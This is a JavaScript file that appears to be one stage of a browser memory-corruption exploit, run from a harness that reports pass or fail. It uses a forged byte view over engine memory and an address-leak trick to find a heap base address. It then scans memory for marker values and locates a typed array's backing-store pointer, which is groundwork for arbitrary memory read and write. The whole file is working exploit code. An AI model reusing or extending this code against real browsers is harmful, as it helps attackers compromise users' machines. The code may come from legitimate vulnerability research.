// Find the backing-store address of an owned ordinary Uint8Array, then check
// whether its reachable JS cell stores that exact address. Read only.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_anchor_preflight_failed");
  var forged = state.view;
  function matches4(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(forged[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    var hex = "0x";
    for (var h = 7; h >= 0; h--)
      hex += bytes[h].toString(16).padStart(2, "0");
    return hex;
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches4(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var liveAnchor = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches4(candidates[c], 0x55667788)) liveAnchor.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (liveAnchor.length !== 1 || !matches4(liveAnchor[0], 0x11223344))
    throw new Error("anchor_live_count_" + liveAnchor.length);
  var base = Number(anchorWord) + 8 - liveAnchor[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  if (api && typeof api.markSync === "function")
    api.markSync("typed_view_base_calibrated");
  phase = "owned_view";
  var owned = new Uint8Array(65536);
  owned.fill(0x44);
  var signature = [0x31, 0x42, 0x53, 0x64, 0x75, 0x86, 0x97, 0xa8];
  for (var s = 0; s < 8; s++) owned[s] = signature[s];
  state.ownedTypedView = owned;
  var viewWord = wordOf(owned);
  var viewIndex = Number(viewWord) - base;
  if (!Number.isSafeInteger(viewIndex) || viewIndex < 0 ||
      viewIndex + 95 >= 16777216)
    throw new Error("typed_view_cell_outside_window");
  function matches8(at) {
    for (var b = 0; b < 8; b++)
      if (forged[at + b] !== signature[b]) return false;
    return true;
  }
  var dataCandidates = [];
  var dataCount = 0;
  for (var p = 0; p + 7 < 4194304; p++)
    if (matches8(p)) {
      dataCount++;
      if (dataCandidates.length < 32) dataCandidates.push(p);
    }
  if (!dataCount || dataCount > 32)
    throw new Error("data_candidate_count_" + dataCount);
  var liveData = [];
  try {
    owned[0] = 0x5a;
    for (var q = 0; q < dataCandidates.length; q++)
      if (forged[dataCandidates[q]] === 0x5a &&
          forged[dataCandidates[q] + 1] === 0x42)
        liveData.push(dataCandidates[q]);
  } finally {
    owned[0] = 0x31;
  }
  if (liveData.length !== 1 || !matches8(liveData[0]))
    throw new Error("data_live_count_" + liveData.length);
  var dataIndex = liveData[0];
  var dataAddress = base + dataIndex;
  function hexWord(at) {
    var hex = "0x";
    for (var b = 7; b >= 0; b--)
      hex += forged[at + b].toString(16).padStart(2, "0");
    return hex;
  }
  var pointerOffsets = [];
  var cellWords = [];
  for (var off = 0; off < 96; off += 8) {
    var word = hexWord(viewIndex + off);
    cellWords.push(word);
    if (Number(word) === dataAddress) pointerOffsets.push(off);
  }
  result = { id: "typed_view_pointer_scan_v2",
    status: owned[0] === 0x31 && state.array[0] === state.a ? "pass" : "fail",
    details: { base: "0x" + base.toString(16),
      view_word: viewWord, view_index: viewIndex,
      data_index: dataIndex, data_address: "0x" + dataAddress.toString(16),
      data_candidates: dataCount,
      pointer_offsets: pointerOffsets.join(","),
      cell_words: cellWords.join(","),
      owned_restored: owned[0] === 0x31 } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "typed_view_pointer_scan_v2", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
